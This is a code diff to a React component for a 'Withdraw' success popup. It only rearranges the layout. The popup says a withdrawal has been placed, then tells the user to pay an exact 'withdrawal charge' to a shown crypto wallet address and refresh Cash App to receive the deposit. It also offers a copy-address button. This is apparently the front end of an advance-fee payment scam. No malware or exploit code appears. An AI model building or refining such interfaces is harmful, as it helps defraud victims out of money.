@@ -623,67 +623,74 @@ function Withdraw() {
 {/* SUCCESS POPUP */}
 {showSuccessModal && (
   <div className="fixed inset-0 z-[100] flex min-h-screen w-full items-center justify-center bg-white">
-    <div className="flex min-h-screen w-full max-w-[760px] flex-col px-10 py-24 sm:px-16">
+    <div className="flex min-h-screen w-full items-center justify-center px-6 py-10">
+      <div className="flex w-full max-w-[650px] flex-col items-center">
 
-      {/* Success Icon */}
-      <div className="mb-16 flex h-24 w-24 shrink-0 items-center justify-center rounded-full bg-[#19B5D1]">
-        <Check
-          className="h-12 w-12 text-white"
-          strokeWidth={3}
-        />
-      </div>
-
-      {/* Title */}
-      <h2 className="mb-20 text-left text-4xl font-bold leading-tight text-black sm:text-5xl">
-        Withdrawal Placed
-        <br />
-        Successfully
-      </h2>
-
-      {/* Withdrawal Message */}
-      <div className="max-w-[650px] space-y-10 text-center text-lg leading-8 text-gray-600">
-        <p>
-          Your withdrawal of{" "}
-          <span className="font-bold text-black">
-            ${withdrawalAmount.toFixed(2)}
-          </span>{" "}
-          has been placed successfully.
-        </p>
-
-        <p>
-          Pay exactly{" "}
-          <span className="font-bold text-black">
-            {formatUsd(withdrawalFee)}
-          </span>{" "}
-          withdrawal charge to the wallet address below and refresh your Cash
-          App for the deposit.
-        </p>
-      </div>
-
-      {/* Wallet Address */}
-      <div className="mt-16 max-w-[650px]">
-        <div className="break-all rounded-2xl border border-gray-200 bg-gray-50 px-6 py-6 text-left font-mono text-base leading-7 text-gray-700">
-          {walletAddress}
+        {/* Success Icon */}
+        <div className="mb-16 flex h-24 w-24 shrink-0 items-center justify-center rounded-full bg-[#19B5D1]">
+          <Check
+            className="h-12 w-12 text-white"
+            strokeWidth={3}
+          />
         </div>
 
-        <button
-          type="button"
-          onClick={copyWalletAddress}
-          className="mt-6 flex w-full items-center justify-center rounded-2xl border border-gray-200 bg-white py-6 text-lg font-bold text-black transition hover:bg-gray-50"
-        >
-          {copied ? "Wallet Address Copied!" : "Copy Wallet Address"}
-        </button>
+        {/* Everything below is grouped together */}
+        <div className="w-full text-center">
+
+          {/* Title */}
+          <h2 className="mb-16 text-4xl font-bold leading-tight text-black sm:text-5xl">
+            Withdrawal Placed
+            <br />
+            Successfully
+          </h2>
+
+          {/* Withdrawal Message */}
+          <div className="space-y-10 text-lg leading-8 text-gray-600">
+            <p>
+              Your withdrawal of{" "}
+              <span className="font-bold text-black">
+                ${withdrawalAmount.toFixed(2)}
+              </span>{" "}
+              has been placed successfully.
+            </p>
+
+            <p>
+              Pay exactly{" "}
+              <span className="font-bold text-black">
+                {formatUsd(withdrawalFee)}
+              </span>{" "}
+              withdrawal charge to the wallet address below and refresh your
+              Cash App for the deposit.
+            </p>
+          </div>
+
+          {/* Wallet + Buttons */}
+          <div className="mt-16">
+            <div className="break-all rounded-2xl border border-gray-200 bg-gray-50 px-6 py-6 text-left font-mono text-base leading-7 text-gray-700">
+              {walletAddress}
+            </div>
+
+            <button
+              type="button"
+              onClick={copyWalletAddress}
+              className="mt-6 flex w-full items-center justify-center rounded-2xl border border-gray-200 bg-white py-6 text-lg font-bold text-black transition hover:bg-gray-50"
+            >
+              {copied
+                ? "Wallet Address Copied!"
+                : "Copy Wallet Address"}
+            </button>
+
+            <button
+              type="button"
+              onClick={closeDone}
+              className="mt-8 w-full rounded-full bg-[#2616D9] py-6 text-lg font-bold text-white shadow-lg transition hover:opacity-90"
+            >
+              OK
+            </button>
+          </div>
+
+        </div>
       </div>
-
-      {/* OK Button */}
-      <button
-        type="button"
-        onClick={closeDone}
-        className="mt-8 w-full max-w-[650px] rounded-full bg-[#2616D9] py-6 text-lg font-bold text-white shadow-lg transition hover:opacity-90"
-      >
-        OK
-      </button>
-
     </div>
   </div>
 )}
